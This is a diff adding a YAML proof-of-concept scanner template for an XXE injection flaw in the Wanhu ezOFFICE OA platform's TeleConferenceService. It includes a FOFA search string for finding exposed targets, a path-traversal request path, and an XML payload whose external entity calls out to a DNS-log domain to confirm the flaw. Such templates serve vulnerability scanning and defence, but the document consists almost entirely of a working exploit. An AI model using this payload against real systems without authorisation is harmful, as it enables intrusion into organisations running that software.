@@ -1,0 +1,26 @@
+id: poc-yaml-wan-hu-ezoffice-teleconferenceservice-xxe
+info:
+  name: 万户OA TeleConferenceService XXE注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 万户ezOFFICE协同管理平台
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService
+  data: '<?xml version="1.0" encoding="UTF-8" ?>
+
+    <!DOCTYPE ANY [
+
+    <!ENTITY xxe SYSTEM "http://{{.reverseDomain}}" >]>
+
+    <value>&xxe;</value>'
+  expression: 'reverse.Verify()
+
+    '
+transport: http
